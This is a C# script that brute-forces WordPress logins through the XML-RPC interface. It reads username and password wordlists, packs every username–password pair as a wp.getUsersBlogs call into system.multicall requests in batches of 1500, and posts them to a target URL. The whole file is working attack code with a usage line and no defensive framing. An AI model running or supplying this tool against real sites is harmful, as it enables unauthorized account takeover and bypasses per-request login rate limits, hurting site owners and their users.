using System;
using System.IO;
using System.Net;
using System.Xml.Linq;
using System.Text.RegularExpressions;


public class WpXmlRpc {
	private string userFilename = String.Empty;
    private string passFilename = String.Empty;
	private string url = String.Empty;
	//private string userAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";

	private List<string> users = new List<string>();
	private List<string> passwords = new List<string>();

	public WpXmlRpc(string username, string password, string url){
		this.userFilename = username;
		this.passFilename = password;
		this.url = url;
	} 

	public int ReadFiles() {
		string lineBuff = null;

		using (TextReader reader = File.OpenText(userFilename))
		{
		    while((lineBuff = reader.ReadLine()) != null) 
		    {
		    	this.users.Add(lineBuff);    
		    }
		}

		using (TextReader reader = File.OpenText(passFilename))
		{
		    while((lineBuff = reader.ReadLine()) != null) 
		    {
		    	this.passwords.Add(lineBuff);    
		    }
		}

		return this.users.Count() * this.passwords.Count();

	}

	public string HttpPost(string URI, string Parameters) {
	   System.Net.WebRequest req = System.Net.WebRequest.Create(URI);
	   req.ContentType = "text/xml";
	   req.Method = "POST";

	   byte [] bytes = System.Text.Encoding.UTF8.GetBytes(Parameters);
	   req.ContentLength = bytes.Length;
	   System.IO.Stream os = req.GetRequestStream ();
	   os.Write (bytes, 0, bytes.Length); 
	   os.Close ();

	   HttpWebResponse resp = null;
	   resp = (HttpWebResponse)req.GetResponse();

	   if (resp== null) return null;
	   string output = "";
	   using(System.IO.StreamReader sr = new System.IO.StreamReader(resp.GetResponseStream()))
	   {
	       output = sr.ReadToEnd().Trim();
	   }

	   return output;
	}

	public void DoRpcCalls(int start, int end) {
		string xmlOut = "";


		XElement dataContainer = new XElement("data");
		XElement callWrapper = new XElement("params", new XElement("param", new XElement("value", new XElement("array", dataContainer))));
		XElement multiCall = new XElement("methodCall", new XElement("methodName", "system.multicall"), callWrapper);
		int count = 0;
		foreach (var u in users) {
			foreach(var p in passwords){
				XElement methodContainer = new XElement("value");
				XElement methodContainerStruct = new XElement("struct");
				XElement method = new XElement("member", new XElement("name","methodName"), new XElement("value", new XElement("string", "wp.getUsersBlogs")));
				XElement methodParams = 
				new XElement("member", 
					new XElement("name","params"), 
					new XElement("value", 
						new XElement("array", 
							new XElement("data", 
								//new XElement("blog_id", new XElement("int", 1)), 
								new XElement("value", new XElement("string", u)), 
								new XElement("value", new XElement("string", p))
								//new XElement("value", new XElement("string", "category"))
							)
						)
					)
				);

				if(count >= start && count <= end){
					methodContainerStruct.Add(method, methodParams);
					methodContainer.Add(methodContainerStruct);
					dataContainer.Add(methodContainer);
				}

				count++;
			}
		}

		xmlOut = multiCall.ToString();
		Console.WriteLine(xmlOut);
		xmlOut = Regex.Replace(xmlOut, @"\s+", "");
		Console.WriteLine(this.HttpPost(this.url, xmlOut));
		Console.WriteLine("*****************************************************************************");

	}


}




if(Env.ScriptArgs.Count == 3){
	var rpc = new WpXmlRpc(Env.ScriptArgs[0], Env.ScriptArgs[1], Env.ScriptArgs[2]);
	int numEntries = rpc.ReadFiles();
	bool done = false;
	int numStart = 0;
	int numPerBatch = 1500;
	int numEnd =  numPerBatch;
	while(!done){
		//rpc.DoRpcCalls();
		if(numEntries <= (numStart + numPerBatch)){
			numEnd = numEntries;
			done = true;
		}
		else {
			numEnd = numStart + numPerBatch;
		}

		Console.WriteLine("StartRange: " + numStart.ToString() + " - EndRange: " + numEnd.ToString());
		rpc.DoRpcCalls(numStart, numEnd);
		numStart = numEnd;

	}
}
else {
	Console.WriteLine("Incorrect parameters specified.");
	Console.WriteLine("Syntax: wp-xmlrpc <username file> <password file> <url>");
}
